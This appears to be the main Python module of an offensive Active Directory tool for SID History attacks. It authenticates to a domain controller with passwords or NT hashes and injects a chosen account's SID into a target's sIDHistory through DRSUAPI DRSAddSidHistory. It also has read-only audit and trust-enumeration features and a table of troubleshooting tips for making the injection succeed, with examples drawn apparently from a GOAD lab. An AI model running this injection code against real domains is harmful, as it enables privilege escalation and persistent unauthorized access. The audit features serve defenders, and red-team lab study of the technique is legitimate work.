"""
SID History Attack Implementation
Main orchestrator: wires up authentication, LDAP operations,
DRSUAPI calls, scanning, and output formatting.
"""

import logging
from typing import Optional, List, Dict, Any

from .auth import AuthenticationManager
from .ldap_operations import LDAPOperations
from .sid_utils import SIDConverter
from .output import OutputFormatter
from .scanner import DomainScanner, AuditReport


class SIDHistoryAttack:
    """
    Main class for performing SID History operations from a remote Linux host.

    Injection uses DRSUAPI DRSAddSidHistory (opnum 20) — the only method that
    bypasses the DC's SAM layer. Audit features use read-only LDAP queries.
    """

    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
        self.dc_ip = dc_ip
        self.domain = domain
        self.dc_hostname = dc_hostname or dc_ip

        self.auth_manager = AuthenticationManager(dc_ip, domain, dc_hostname)
        self.connection = None
        self.ldap_ops = None
        self.drsuapi_client = None
        self.base_dn = SIDConverter.domain_to_dn(domain)
        self.domain_sid = None

        self._formatter = OutputFormatter()
        self._scanner = None

        logging.info(f"Initialized targeting {dc_ip} ({domain})")

    # ─── CONNECTION MANAGEMENT ────────────────────────────────────────

    def authenticate(self, auth_method: str, **kwargs) -> bool:
        """Authenticate to the domain controller via LDAP."""
        self.connection = self.auth_manager.get_connection(auth_method, **kwargs)

        if self.connection:
            self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
            self._scanner = DomainScanner(self.ldap_ops, self.domain)

            # Try to discover domain SID
            self.domain_sid = self.ldap_ops.get_domain_sid()
            if self.domain_sid:
                logging.info(f"Domain SID: {self.domain_sid}")

            logging.info(f"Successfully authenticated to {self.dc_ip}")
            return True
        else:
            logging.error("Authentication failed")
            return False

    def connect_drsuapi(self, username: str = None, password: str = '',
                        lm_hash: str = '', nt_hash: str = '',
                        do_kerberos: bool = False) -> bool:
        """
        Establish a DRSUAPI RPC connection for DRSAddSidHistory.
        Uses stored credentials from LDAP auth if not provided.
        """
        try:
            from .drsuapi import DRSUAPIClient
        except ImportError as e:
            logging.error(f"DRSUAPI module unavailable: {e}")
            return False

        self.drsuapi_client = DRSUAPIClient(self.dc_ip, self.domain, self.dc_hostname)

        # Use stored credentials if not provided
        if not username:
            username = self.auth_manager._username or ''
            password = self.auth_manager._password or ''
            lm_hash = self.auth_manager._lm_hash or ''
            nt_hash = self.auth_manager._nt_hash or ''
            do_kerberos = self.auth_manager._do_kerberos

        success = self.drsuapi_client.connect(
            username=username,
            password=password,
            domain=self.domain,
            lm_hash=lm_hash,
            nt_hash=nt_hash,
            do_kerberos=do_kerberos
        )

        if success:
            logging.info("DRSUAPI connection established")
        else:
            logging.error("Failed to establish DRSUAPI connection")
            self.drsuapi_client = None

        return success

    def disconnect(self):
        """Close all connections."""
        if self.connection:
            try:
                self.connection.unbind()
                logging.info("LDAP disconnected")
            except Exception:
                pass
            finally:
                self.connection = None
                self.ldap_ops = None

        if self.drsuapi_client:
            self.drsuapi_client.disconnect()
            self.drsuapi_client = None

    # ─── SID LOOKUPS ──────────────────────────────────────────────────

    def get_user_sid(self, sam_account_name: str) -> Optional[str]:
        """Get the SID of any AD object by sAMAccountName."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return None
        return self.ldap_ops.get_object_sid(sam_account_name)

    def get_current_sid_history(self, sam_account_name: str) -> List[str]:
        """Get the current sIDHistory of an object."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return []
        return self.ldap_ops.get_sid_history(sam_account_name)

    def get_domain_sid(self) -> Optional[str]:
        """Get the domain SID."""
        return self.domain_sid

    # ─── SID HISTORY INJECTION (DRSUAPI) ──────────────────────────────

    def inject_sid_history(self, target_user: str, source_user: str,
                          source_domain: Optional[str] = None,
                          src_creds_user: str = '',
                          src_creds_domain: str = '',
                          src_creds_password: str = '') -> bool:
        """
        Inject the SID of a source user into the target's sIDHistory
        via DRSUAPI DRSAddSidHistory (opnum 20).

        Args:
            target_user: sAMAccountName of target
            source_user: sAMAccountName of source (in source domain)
            source_domain: Source domain (must be cross-forest)
            src_creds_user: Username for source domain auth
            src_creds_domain: Domain for source domain auth
            src_creds_password: Password for source domain auth
        """
        if not self.drsuapi_client:
            logging.info("Establishing DRSUAPI connection...")
            if not self.connect_drsuapi():
                logging.error("Cannot connect to DRSUAPI")
                return False

        src_domain = source_domain or self.domain
        dst_domain = self.domain

        logging.info(f"DRSAddSidHistory: {source_user}@{src_domain} -> {target_user}@{dst_domain}")

        success, error_code, error_msg = self.drsuapi_client.add_sid_history(
            src_domain=src_domain,
            src_principal=source_user,
            dst_domain=dst_domain,
            dst_principal=target_user,
            src_creds_user=src_creds_user,
            src_creds_domain=src_creds_domain,
            src_creds_password=src_creds_password,
        )

        if success:
            logging.info("DRSAddSidHistory RPC call succeeded!")
        else:
            logging.error(f"DRSAddSidHistory failed: {error_msg}")
            self._suggest_drsuapi_fix(error_code)

        return success

    # ─── SCANNING & AUDITING ──────────────────────────────────────────

    def full_audit(self) -> Optional[AuditReport]:
        """Perform a full domain-wide sIDHistory audit."""
        if not self._scanner:
            logging.error("Not connected")
            return None
        return self._scanner.full_audit()

    def scan_user(self, sam_account_name: str):
        """Scan a single object for sIDHistory issues."""
        if not self._scanner:
            logging.error("Not connected")
            return None
        return self._scanner.scan_user(sam_account_name)

    def enumerate_trusts(self) -> List[Dict]:
        """Enumerate domain trusts."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return []
        return self.ldap_ops.enumerate_trusts()

    # ─── HELPERS ──────────────────────────────────────────────────────

    @staticmethod
    def _suggest_drsuapi_fix(error_code: int):
        """Suggest fixes for common DRSUAPI errors."""
        suggestions = {
            5: "Ensure you have Domain Admin privileges in the destination domain",
            8521: "Enable 'Audit account management' (Success+Failure) on the source domain DC.\n"
                  "  On the source DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable",
            8534: "Source and destination are in the same forest.\n"
                  "  DRSAddSidHistory (flags=0) only works cross-forest.\n"
                  "  For same-forest child→parent, use a source in a different forest\n"
                  "  (e.g., essos.local → north.sevenkingdoms.local in GOAD)",
            8536: "Enable 'Audit account management' (Success+Failure) on the destination domain DC.\n"
                  "  On the destination DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable\n"
                  "  Also enable it on the source DC if not already done",
            8547: "You must connect to the DC that holds the destination domain NC",
            8490: "Cross-forest variant requires source and destination in different forests.",
            8447: "Enable auditing: 'Audit account management' must be set to Success/Failure\n"
                  "  in both source and destination domain GPOs",
            8548: "Source DC could not be reached. Ensure:\n"
                  "  - Source DC hostname resolves correctly\n"
                  "  - TcpipClientSupport=1 is set in source DC registry\n"
                  "  - Source DC is the PDC/PDC Emulator",
            1355: "Source domain not found. Check DNS and trust configuration",
        }

        if error_code in suggestions:
            logging.error(f"Suggestion: {suggestions[error_code]}")
